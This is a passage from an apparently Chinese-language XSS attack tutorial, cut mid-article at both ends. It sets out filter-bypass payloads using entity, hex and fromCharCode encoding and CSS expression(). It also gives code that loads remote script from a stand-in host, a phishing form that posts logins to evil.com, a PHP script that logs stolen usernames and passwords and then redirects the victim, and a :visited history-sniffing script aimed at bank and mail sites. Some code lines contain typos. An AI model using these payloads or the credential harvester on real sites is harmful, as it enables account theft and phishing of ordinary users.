<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">成立</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>(4)转码绕过</p><p>由于html属性值支持ascii码的形式，我们可以将字符转换为ascii码进行执行，例如：</p><p><code>&lt;img src=&quot;javascript&amp;#58alert(/xss/);&quot;&gt;</code> &amp;#58是&#39;:&#39;的ascii形式；</p><p>我们甚至可以全部转码</p><p><code>&lt;iframe WIDTH=0 HEIGHT=0 srcdoc=。。。。。。。。。。&amp;#60;&amp;#115;&amp;#67;&amp;#82;&amp;#105;&amp;#80;&amp;#116;&amp;#32;&amp;#115;&amp;#82;&amp;#67;&amp;#61;&amp;#34;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#115;&amp;#58;&amp;#47;&amp;#47;&amp;#48;&amp;#120;&amp;#46;&amp;#97;&amp;#120;&amp;#47;&amp;#49;&amp;#112;&amp;#99;&amp;#68;&amp;#34;&amp;#62;&amp;#60;&amp;#47;&amp;#115;&amp;#67;&amp;#114;&amp;#73;&amp;#112;&amp;#84;&amp;#62;&gt;</code></p><p>还可以把&amp;#01.&amp;#02插入头部，同理回车空格tab键的ascii转码可以插入任意位置;</p><p>(5)事件处理函数</p><p>事件处理函数可以让我们不使用属性就可以完成跨站脚本；</p><p>eg: <code>&lt;input type=&quot;button&quot; value=&quot;click me&quot; onclick=&quot;alert(/xss/)&quot; /&gt;</code></p><p>当我们点击按钮之后就会出现弹窗；当然这样的函数并不只是onclick,也会有很多其他函数</p><p><a href="https://www.runoob.com/jsref/dom-obj-event.html" target="_blank" rel="noopener noreferrer">更多事件函数</a></p><p>(6)css跨站剖析</p><p>利用css样式表来解析XSS脚本；CSS虽然很隐蔽，但需要注意的是不同的浏览器可能不能通用；</p><p>主要了解css跨站，import,expression引用 ；</p><p>(7)扰乱过滤规则</p><p>转换大小写，大小写混用，双引号改单引号或者是不使用引号；</p><figure><img src="/articles/assets/rule1-Cyt28lGz.png" alt="rule1" tabindex="0" loading="lazy"><figcaption>rule1</figcaption></figure><p>利用全角字符替换半角字符；</p><p>利用样式表中/**/注释字符的特性，来插入过滤内容；</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>&lt;XSS STYLE=&quot;xss:expr/*fumo*/ession(alert(&#39;xss&#39;))&quot;&gt;</span></span>
<span class="line"><span>&lt;div style=&quot;wid/**/th: expre/*fumo*/ssion(alert(&#39;XSS&#39;));&quot; &gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>除/**/以外，样式标签中的\和结束符\0也被浏览器忽略；</p><h3 id="_2-3-3-字符编码的利用" tabindex="-1"><a class="header-anchor" href="#_2-3-3-字符编码的利用"><span>2.3.3 字符编码的利用</span></a></h3><p>可将字符转化为十进制编码，16进制等形式的编码进行绕过</p><div class="language-html line-numbers-mode" data-highlighter="shiki" data-ext="html" data-title="html" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">iframe</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> WIDTH</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> HEIGHT</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> srcdoc</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">。。。。。。。。。。&amp;#60;&amp;#115;&amp;#67;&amp;#82;&amp;#105;&amp;#80;&amp;#116;&amp;#32;&amp;#115;&amp;#82;&amp;#67;&amp;#61;&amp;#34;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#115;&amp;#58;&amp;#47;&amp;#47;&amp;#48;&amp;#120;&amp;#46;&amp;#97;&amp;#120;&amp;#47;&amp;#49;&amp;#112;&amp;#99;&amp;#68;&amp;#34;&amp;#62;&amp;#60;&amp;#47;&amp;#115;&amp;#67;&amp;#114;&amp;#73;&amp;#112;&amp;#84;&amp;#62;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>同上可以在编码后加上;</p><p>或者使用&amp;#000,这里的0数量不定；</p><p>16进制可以使用如下形式进行执行，使用eval函数；</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>&lt;script&gt;</span></span>
<span class="line"><span>eval(&quot;\xxx\xxx\xxx\xxx\xxx&quot;);</span></span>
<span class="line"><span>&lt;/script&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>使用eval函数执行10进制代码需要配合String.fromCharCode()使用，这个函数将字符转化为ascii码值；</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>eg: </span></span>
<span class="line"><span>&lt;img src=&quot;javascript:eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))&quot;&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>JScript Encode和VBScript Encode</p><p>利用二者加密的脚本可正常在IE浏览器下执行；</p><h3 id="_2-3-4-跨站拆分法" tabindex="-1"><a class="header-anchor" href="#_2-3-4-跨站拆分法"><span>2.3.4 跨站拆分法</span></a></h3><p>当网站没有限制&lt;&gt;等字符，但是对字符长度有过滤，网站可以重复留言的情况下，我们可以使用跨站拆分法；</p><figure><img src="/articles/assets/kuazhan1-_rcPUXl-.png" alt="kuazhan1" tabindex="0" loading="lazy"><figcaption>kuazhan1</figcaption></figure><p>最后通过eval执行了xss代码；</p><h3 id="_2-3-5-调用shellcode" tabindex="-1"><a class="header-anchor" href="#_2-3-5-调用shellcode"><span>2.3.5 调用shellcode</span></a></h3><p>(1)动态调用远程javascript</p><p>将XSS代码保存在服务器再进行调用；</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>var s=document.creatElement(&quot;script&quot;);</span></span>
<span class="line"><span>s.src=&quot;http://www.xxxx.com/xss.js&quot;;</span></span>
<span class="line"><span>document.getElementByTagName(&quot;head&quot;)[0].aapendChild(s);</span></span>
<span class="line"><span>xss.js中存储着我们的恶意代码</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>(2)使用windows.location.hash</p><p>原理上，使用location.href来管理页面的url，再location.href=url(url自定义)即可对当前页面进行重定向；</p><p>location.hash则可以用来获取或设置页面的标签值；</p><p>(3)xss下载器</p><p>打造一个XSS downloader,事先将shellcode写在网站页面，再利用XMLHTTP控件向网站发送HTTP请求（POST或GET），执行返回的数据；</p><h3 id="_2-3-6-session会话劫持" tabindex="-1"><a class="header-anchor" href="#_2-3-6-session会话劫持"><span>2.3.6 session会话劫持</span></a></h3><p>与cookie的区别:cookie存储在浏览器或是客户端，而session存储在服务端内存内，关闭浏览器(关闭进程)，session就会被清除</p><p>例如：攻击者想要添加管理员账号，可以使用firebug劫持http通信数据，添加即可；</p><p><strong>xss获取webshell</strong></p><p>通过向网站写入恶意代码，上传后门，就可以劫持管理员备份数据库的会话，从而拿到webshell;</p><h3 id="_2-3-7-xss网络钓鱼" tabindex="-1"><a class="header-anchor" href="#_2-3-7-xss网络钓鱼"><span>2.3.7 xss网络钓鱼</span></a></h3><p><strong>XSS Phishing</strong></p><p>(1)钓鱼页面</p><p>尽量做到与原网站相似，html代码可从原网站复制，主要是登陆表单；</p><p>然后将原表单的登陆地址修改例如：</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>&lt;form method=&quot;post&quot; action=&quot;http://www.evil.com/get.php&quot;&gt;</span></span>
<span class="line"><span>//这里的get.php放在自己的vps上用来接收登录信息</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>(2)接收登录信息</p><p>get.php内容如下</p><div class="language-php line-numbers-mode" data-highlighter="shiki" data-ext="php" data-title="php" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;</span><span style="--shiki-light:#383A42;--shiki-dark:#C678DD;">?</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> php</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$data</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> fopen</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;logfile.txt&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;a+&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$login</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $_POST</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;username&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">];</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$pass</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $_POST</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;password&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">];</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">fwrite</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$data</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;Username: </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$login</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\n</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">fwrite</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$data</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;Password: </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$pass</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\n</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">fclose</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$data</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">Header</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;location: http://target.com&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#C678DD;">?</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">//header头用于重新定向到原网站</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">//接收数据形式应与原网址一致</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>(3)XSS Phishing Expliot</p><figure><img src="/articles/assets/phishing-hc7gEFcT.png" alt="phishing" tabindex="0" loading="lazy"><figcaption>phishing</figcaption></figure><p><strong>xss钓鱼的方式</strong></p><p>(1)xss重定向钓鱼</p><p>将原目标网站重新定向到恶意的钓鱼网站</p><div class="language-html line-numbers-mode" data-highlighter="shiki" data-ext="html" data-title="html" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">http://www.xxx.com/index.php?search=&quot;&#39;&gt;&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span><span style="--shiki-light:#383A42;--shiki-dark:#E5C07B;">document</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">location</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">href</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;http://www.emp.com&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>(2)html注入式钓鱼</p><p>直接利用XSS漏洞注射html/javascript代码到页面中；</p><p>(3)XSS跨框架钓鱼</p><p>利用iframe引用第三方内容伪造登陆控件，主页面仍然是正常的域名，隐蔽性较高；</p><p>(4)flash钓鱼</p><p>利用flash文件进行钓鱼，flash好像已经没有更新了；</p><p><strong>更高级的钓鱼方式</strong></p><p>当设置了httponly时，我们无法再通过截取cookie来达到获得用户权限，更为简单的利用方式直接注入js脚本劫持html表单和控制web行为</p><h3 id="_2-3-8-css-javascript-history-hack" tabindex="-1"><a class="header-anchor" href="#_2-3-8-css-javascript-history-hack"><span>2.3.8 css/javascript history hack</span></a></h3><p>原理：利用CSS能自定义访问过的和为访问过的超级链接样式。由于javascript可以读取任何元素的CSS信息，能分辨浏览器应用了哪种样式和用户是否访问过该来链接；</p><div class="language-html line-numbers-mode" data-highlighter="shiki" data-ext="html" data-title="html" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">	&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">H3</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;Visited&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">H3</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">	&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">ul</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> id</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;visited&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">ul</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">	&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">H3</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;Not Visited&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">H3</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">	&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">ul</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> id</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;notvisited&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">ul</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">	&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">script</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> type</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;text/javascript&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">	var</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> websites</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> [</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">		&quot;http://ha.ckers.org/blog/&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">		&quot;http://login.yahoo.com/&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">		&quot;http://mail.google.com/&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">		&quot;http://mail.yahoo.com/&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">		&quot;http://my.yahoo.com/&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">		&quot;http://sla.ckers.org/forum/&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">		&quot;http://slashdot.org/&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">		&quot;http://www.amazon.com/&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">		&quot;http://www.aol.com/&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">		&quot;http://www.apple.com/&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">		&quot;http://www.bankofamerica.com/&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">		&quot;http://www.bankone.com/&quot;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">	];</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">	/* Loop through each URL */</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">	for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">var</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> i</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; </span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">i</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> &lt;</span><span style="--shiki-light:#383A42;--shiki-dark:#E5C07B;"> websites</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">length</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; </span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">i</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">++</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) {</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">		</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">		/* create the new anchor tag with the appropriate URL information */</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">		var</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> link</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E5C07B;"> document</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">createElement</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;a&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E5C07B;">		link</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">id</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;id&quot;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> +</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> i</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E5C07B;">		link</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">href</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> websites</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">i</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">];</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E5C07B;">		link</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">innerHTML</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> websites</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">i</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">];</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">		/* create a custom style tag for the specific link. Set the CSS visited selector to a known value, in this case red */</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E5C07B;">		document</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">write</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;&lt;style&gt;&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E5C07B;">		document</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">write</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;#id&#39;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> +</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> i</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> +</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;:visited {color: #FF0000;}&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E5C07B;">		document</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">write</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;&lt;/style&gt;&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">		</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">		/* quickly add and remove the link from the DOM with enough time to save the visible computed color. */</span></span>
